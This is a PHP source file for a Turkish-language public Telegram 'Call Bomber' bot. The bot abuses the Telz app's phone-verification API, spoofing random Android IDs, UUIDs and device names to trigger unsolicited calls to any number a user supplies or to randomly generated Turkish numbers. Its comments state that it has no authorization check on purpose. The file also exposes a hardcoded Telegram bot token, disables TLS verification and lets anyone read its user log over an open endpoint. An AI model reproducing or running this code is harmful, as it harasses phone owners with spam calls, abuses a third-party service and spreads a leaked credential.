<?php
/**
 * Ritalin Tool Call Bomber - PUBLIC BOT
 * Herkes kullanabilir - Yetki kontrolü YOK
 * Telz API üzerinden arama gönderir
 */

// ==================== KONFIGÜRASYON ====================
define('MODE', 'TEST_RANDOM_IDS');
define('GOKU', 300);
define('BASE_URL', 'https://api.telz.com/');
define('USER_AGENT', 'Telz-Android/17.5.33');
define('APP_VERSION', '17.5.33');
define('OS', 'android');
define('OS_VERSION', '15');
define('LOOP_INTERVAL', 20);
define('MAX_RUNS', 0);

// ==================== TELEGRAM BOT KONFIG ====================
define('BOT_TOKEN', '8894652888:AAEjzcwqynhFBwoHjwhuGX9vmQnTBGBs61g');
define('WEBHOOK_URL', 'https://freeapiservice-q08q.onrender.com/arama.php');

// ==================== YASAKLI NUMARALAR ====================
$BANNED_NUMBERS = [''];

// ==================== FONKSİYONLAR ====================

function randomAndroidId() {
    return bin2hex(random_bytes(8));
}

function randomDeviceName() {
    $brands = ['Pixel', 'Xiaomi', 'Samsung', 'OnePlus', 'Moto'];
    return $brands[array_rand($brands)] . '-' . substr(bin2hex(random_bytes(3)), 0, 6);
}

function generateUUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

function generateRandomTurkishNumber() {
    $operators = ['505', '506', '507', '530', '531', '532', '533', '534', '535', '536', '537', '538', '539', '540', '541', '542', '543', '544', '545', '546', '547', '548', '549', '550', '551', '552', '553', '554', '555', '556', '557', '558', '559', '560', '561', '562', '563', '564', '565', '566', '567', '568', '569'];
    $operator = $operators[array_rand($operators)];
    $number = $operator . str_pad(mt_rand(0, 9999999), 7, '0', STR_PAD_LEFT);
    return '+90' . $number;
}

function isBannedNumber($phone) {
    global $BANNED_NUMBERS;
    $cleanPhone = str_replace(['+', ' ', '-', '(', ')'], '', $phone);
    foreach ($BANNED_NUMBERS as $banned) {
        $cleanBanned = str_replace(['+', ' ', '-', '(', ')'], '', $banned);
        if ($cleanPhone === $cleanBanned) {
            return true;
        }
    }
    return false;
}

function telzRequest($endpoint, $payload, $androidId = null, $uuid = null) {
    if (MODE === 'TEST_RANDOM_IDS' && $androidId === null) {
        $androidId = randomAndroidId();
    }
    if ($uuid === null) $uuid = generateUUID();
    
    $payload['android_id'] = $androidId ?? '13e50e93a6399e67';
    $payload['app_version'] = APP_VERSION;
    $payload['os'] = OS;
    $payload['os_version'] = OS_VERSION;
    $payload['ts'] = (int)(microtime(true) * 1000);
    $payload['uuid'] = $uuid;
    
    $ch = curl_init(BASE_URL . $endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: ' . USER_AGENT,
        'Accept-Encoding: gzip',
        'Content-Type: application/json; charset=UTF-8',
        'Accept: application/json'
    ]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($httpCode === 429) {
        throw new Exception("Fazla deneme! Retry-After kontrol edin.");
    }
    if ($httpCode >= 400) {
        throw new Exception("HTTP Hata: $httpCode");
    }
    if ($error) {
        throw new Exception("CURL Hatası: $error");
    }
    
    return json_decode($response, true) ?? $response;
}

function sendCall($phone) {
    if (isBannedNumber($phone)) {
        return ['success' => false, 'message' => "❌ Bu numara kullanılamaz!"];
    }
    
    try {
        $androidId = randomAndroidId();
        $uuid = generateUUID();
        $deviceName = (MODE === 'TEST_RANDOM_IDS') ? randomDeviceName() : 'Xiaomi 2311DRK48G';
        
        telzRequest('app/auth_list', ['event' => 'auth_list'], $androidId, $uuid);
        telzRequest('app/run', [
            'event' => 'run',
            'device_name' => $deviceName,
            'ipv4_address' => '10.1.10.1',
            'ipv6_address' => 'FE80::1',
            'lang' => 'tr',
            'network_country' => 'tr',
            'network_type' => '4G',
            'roaming' => 'no',
            'root' => 'no',
            'run_id' => '',
            'sim_country' => 'tr'
        ], $androidId, $uuid);
        
        telzRequest('app/stat_btns', [
            'event' => 'stat_btns',
            'btn' => 'on_reg_continue'
        ], $androidId, $uuid);
        
        telzRequest('app/validate_phonenumber', [
            'event' => 'validate_phonenumber',
            'phone' => $phone,
            'region' => 'TR'
        ], $androidId, $uuid);
        
        $result = telzRequest('app/auth_call', [
            'event' => 'auth_call',
            'phone' => $phone,
            'attempt' => '0',
            'lang' => 'tr'
        ], $androidId, $uuid);
        
        if (isset($result['status']) && $result['status'] === 'ok') {
            return ['success' => true, 'message' => "✅ Arama gönderildi: $phone"];
        } else {
            $error = $result['reason'] ?? json_encode($result) ?? 'Bilinmeyen';
            return ['success' => false, 'message' => "❌ Hata: $error"];
        }
        
    } catch (Exception $e) {
        return ['success' => false, 'message' => "❌ Hata: " . $e->getMessage()];
    }
}

// ==================== TELEGRAM BOT MESAJ GÖNDER ====================
function sendTelegramMessage($chatId, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'HTML'];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

// ==================== WEBHOOK ====================
if (php_sapi_name() !== 'cli') {
    $content = file_get_contents('php://input');
    $update = json_decode($content, true);
    
    // Webhook set
    if (isset($_GET['setwebhook'])) {
        $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook?url=" . urlencode(WEBHOOK_URL);
        $result = file_get_contents($url);
        echo $result;
        exit;
    }
    
    // Log görüntüle
    if (isset($_GET['log'])) {
        header('Content-Type: text/plain; charset=utf-8');
        if (file_exists('telz_bot.log')) {
            echo file_get_contents('telz_bot.log');
        } else {
            echo "Log dosyası bulunamadı.";
        }
        exit;
    }
    
    // Log temizle
    if (isset($_GET['clearlog'])) {
        file_put_contents('telz_bot.log', '');
        echo "Log temizlendi.";
        exit;
    }
    
    // BOT KOMUTLARI - HERKES KULLANABİLİR (YETKİ KONTROLÜ YOK)
    if ($update && isset($update['message'])) {
        $chatId = $update['message']['chat']['id'];
        $text = $update['message']['text'] ?? '';
        $username = $update['message']['from']['username'] ?? 'bilinmeyen';
        
        // Log
        $logEntry = "[" . date('Y-m-d H:i:s') . "] $username ($chatId): $text\n";
        file_put_contents('telz_bot.log', $logEntry, FILE_APPEND);
        
        // /start
        if ($text === '/start') {
            sendTelegramMessage($chatId, "📞 <b>Call Bomber - Public Bot</b>\n\n"
                . "Herkes kullanabilir! 🎉\n\n"
                . "Komutlar:\n"
                . "/call +905551234567 - Arama gönder\n"
                . "/random - Rastgele numara gönder\n"
                . "/status - Bot durumu");
            exit;
        }
        
        // /random
        if ($text === '/random') {
            $randomPhone = generateRandomTurkishNumber();
            sendTelegramMessage($chatId, "📞 Rastgele numara: <code>$randomPhone</code>\n⏳ Arama gönderiliyor...");
            $result = sendCall($randomPhone);
            sendTelegramMessage($chatId, $result['message']);
            exit;
        }
        
        // /call +905551234567
        if (strpos($text, '/call ') === 0) {
            $phone = trim(substr($text, 6));
            if (empty($phone)) {
                sendTelegramMessage($chatId, "❌ Numara girin: /call +905551234567");
                exit;
            }
            
            sendTelegramMessage($chatId, "⏳ Arama gönderiliyor: $phone...");
            $result = sendCall($phone);
            sendTelegramMessage($chatId, $result['message']);
            exit;
        }
        
        // /status
        if ($text === '/status') {
            sendTelegramMessage($chatId, "✅ Bot aktif (PUBLIC)\nMODE: " . MODE . "\nLOOP: " . LOOP_INTERVAL . "s");
            exit;
        }
        
        sendTelegramMessage($chatId, "❌ Bilinmeyen komut. /start yazın.");
        exit;
    }
    
    // Normal HTTP isteği
    $phone = $_GET['phone'] ?? $_POST['phone'] ?? null;
    if ($phone) {
        $result = sendCall($phone);
        header('Content-Type: application/json');
        echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        exit;
    }
    
    echo json_encode(['status' => 'ok', 'message' => 'Call Bomber Aktif - Public Mode']);
    exit;
}

// ==================== CLI BOT MODU ====================
if (php_sapi_name() === 'cli') {
    echo "\n========================================\n";
    echo "  📞 CALL BOMBER - PUBLIC\n";
    echo "========================================\n";
    echo "  MODE: " . MODE . "\n";
    echo "  LOOP_INTERVAL: " . LOOP_INTERVAL . "s\n";
    echo "========================================\n\n";
    
    $phone = readline("Numara gir (+90xx) veya 'random': ");
    $phone = trim($phone);
    
    if (strtolower($phone) === 'random') {
        $phone = generateRandomTurkishNumber();
        echo "📞 Rastgele: $phone\n";
    }
    
    if (empty($phone)) {
        echo "❌ Numara girilmedi.\n";
        exit(1);
    }
    
    echo "\n🚀 Arama gönderiliyor...\n";
    $result = sendCall($phone);
    echo "\n📊 " . $result['message'] . "\n";
}